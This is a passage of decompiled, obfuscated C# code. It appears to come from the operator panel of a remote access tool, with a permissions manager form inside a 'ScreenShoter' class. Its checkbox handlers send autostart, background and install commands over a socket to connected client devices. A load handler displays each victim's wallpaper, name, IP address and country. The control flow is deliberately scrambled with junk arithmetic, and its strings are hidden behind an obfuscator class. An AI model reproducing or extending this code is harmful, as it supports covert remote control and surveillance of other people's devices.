            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00311786E54 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003591D2658),
              (object) ((ScreenShoter) this).Classclient
            };
            num1 = (int) num2 * -2009279934 ^ -1531832605;
            continue;
          case 1:
            goto label_10;
          case 2:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            num1 = (int) num2 * -1359253952 ^ -1043399065;
            continue;
          case 3:
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * 615287309 ^ 1524198739;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u00306031C25);
            num1 = (int) num2 * -1662954110 ^ 851092109;
            continue;
          case 5:
            int num3 = ((ScreenShoter) this).Classclient == null ? -156219637 : (num3 = 572335704);
            num1 = num3 ^ (int) num2 * -104676618;
            continue;
          case 6:
            goto label_1;
          case 7:
            ((ScreenShoter) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -507715176 ^ 2035300280;
            continue;
          default:
            goto label_11;
        }
      }
label_10:
      return;
label_11:;
    }

    private void Panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void Toggle2_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkautostart.Checked)
        return;
label_1:
      int num1 = 615942231;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(num1 ^ ~~(-91793279 * -141488465 + ~-35217986 ^ -141756731 - (-201246289 - 1051527504))) ^ ~579360877 ^ ~1676819412 ^ 1468423794)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * 1934596517 ^ 132094858;
            continue;
          case 2:
            goto label_7;
          case 3:
            int num3 = ((ScreenShoter) this).Classclient == null ? -1331580267 : (num3 = -63516574);
            num1 = num3 ^ (int) num2 * 781506284;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034A534F3D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00364011E4A),
              (object) ((ScreenShoter) this).Classclient
            });
            num1 = (int) num2 * 2061838783 ^ -27108723;
            continue;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    private void Checkbg_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.Checkbg.Checked)
        return;
label_1:
      int num1 = 1590081167;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~num1 + (1361392051 - -507276787) - ~(--1811966535 ^ 1038709077))) % 4U)
        {
          case 0:
            string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003771E1053 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00306093F6E),
              (object) ((ScreenShoter) this).Classclient
            });
            num1 = (int) num2 * 883709078 ^ 1766328537;
            continue;
          case 1:
            int num3 = ((ScreenShoter) this).Classclient == null ? 1823175511 : (num3 = 2015287282);
            num1 = num3 ^ (int) num2 * -1152604154;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUICheckBox1_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkinstall.Enabled)
        return;
label_1:
      int num1 = 1654537116;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 - (~(1751920756 - -1295449833) * 743730567 * -1032847493 ^ ~(-1355470117 * 17756433) - ~(1735521086 - 840565033) - ~(1276420944 - 1336065746 - (-1244521435 ^ 715923900)))) + ~(-746104263 * 1076500233 * 1187151051)) * 722466399)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_8;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003635B6611 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0035F022855),
              (object) ((ScreenShoter) this).Classclient
            });
            num1 = (int) num2 * 659511392 ^ -229228620;
            continue;
          case 3:
            int num3 = ((ScreenShoter) this).Classclient == null ? 73902666 : (num3 = 1753763225);
            num1 = num3 ^ (int) num2 * -396163540;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1836896081 ^ -713956189;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u003681E1B0B);
            num1 = (int) num2 * 759181265 ^ 528418617;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void PermissionsManager_Load(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((ScreenShoter) this).Classclient).Wallpaper;
label_1:
        int num1 = 53484854;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((num1 - 192115519 * (-895548845 ^ 626814086 - -1866056913 + (230938245 - 349075707) + (-868894184 + 1686597473)) + -1497145539 ^ ~~857526243 ^ -1837843613 * (1161039971 * 1110428583)) * -1162599635 ^ -2044007489 ^ -1960937710)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              this.clinameinfo.Text = EXGuarder.\u003516E3F73 + ((Data._Closure\u0024__39\u002D12) ((ScreenShoter) this).Classclient).ClientName + Strings.Space(2) + EXGuarder.\u0032D572713 + ((Data) ((ScreenShoter) this).Classclient).ClientAddressIP + Strings.Space(2) + EXGuarder.\u00353504878 + ((Data._Closure\u0024__39\u002D11) ((ScreenShoter) this).Classclient).Country;
              num1 = (int) num2 * -1842406744 ^ -379814746;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern PermissionsManager(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] obj,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void recordnames(object[] obj);

    public delegate void updatedele(object[] obj);
  }
}
